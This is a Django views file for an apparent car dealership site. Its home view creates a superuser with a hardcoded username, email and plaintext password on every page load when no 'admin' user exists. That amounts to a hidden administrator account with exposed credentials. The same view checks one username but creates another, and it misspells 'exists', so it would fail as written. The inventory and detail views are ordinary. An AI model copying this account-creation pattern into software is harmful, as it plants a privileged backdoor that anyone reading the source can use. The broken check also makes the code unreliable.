from django.shortcuts import get_object_or_404, render
from .models import Car

def home(request):
    from django.contrib.auth.models import User
    if not User.objects.filter(username='admin').exixts():
        User.objects.create_superuser('max237', 'max237@gmail.com', 'Unterhaltungsmedia237???')
    return render(request, 'main/home.html')


def inventory(request):
    cars = Car.objects.all()
    context = {"cars": cars}
    return render(request, "main/shop.html", context)


def car_details(request, pk):
    car = get_object_or_404(Car.objects.prefetch_related("images"), pk=pk)
    context = {"car": car}
    return render(request, "main/car-details.html", context)
